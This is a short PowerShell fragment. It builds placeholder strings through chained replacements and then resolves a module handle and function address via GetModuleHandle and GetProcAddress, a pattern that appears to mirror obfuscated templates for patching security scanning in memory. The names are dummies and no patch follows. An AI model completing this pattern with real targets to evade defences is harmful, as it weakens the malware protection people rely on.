$ObfInitialDate = Get-Date;

$ObfString = 'magic, script'
$ObfString = $ObfString.replace('ma', 'xy')
$ObfString = $ObfString.replace('gi', 'z')
$ObfString = $ObfString.replace('c,', '!')
$ObfString = $ObfString.replace(' ', 's')
$ObfString = $ObfString.replace('sc', 'py')
$ObfString = $ObfString.replace('ript', 'zz')

$ObfString2 = 'magic, script'
$ObfString2 = $ObfString2.replace('ma', 'XY')
$ObfString2 = $ObfString2.replace('gi', 'Z')
$ObfString2 = $ObfString2.replace('c,', '!')
$ObfString2 = $ObfString2.replace(' ', 's')
$ObfString2 = $ObfString2.replace('sc', 'Py')
$ObfString2 = $ObfString2.replace('ript', 'ZZ')

$ObfString3 = 'magic, script'
$ObfString3 = $ObfString3.replace('magic', 'Qu')
$ObfString3 = $ObfString3.replace(', ', 'ff')
$ObfString3 = $ObfString3.replace('script', 'er')

$ObfAddress = [APIs]::GetModuleHandle($ObfString)
[IntPtr] $ObfFuncAddr = [APIs]::GetProcAddress($ObfAddress, $ObfString2 + $ObfString3)
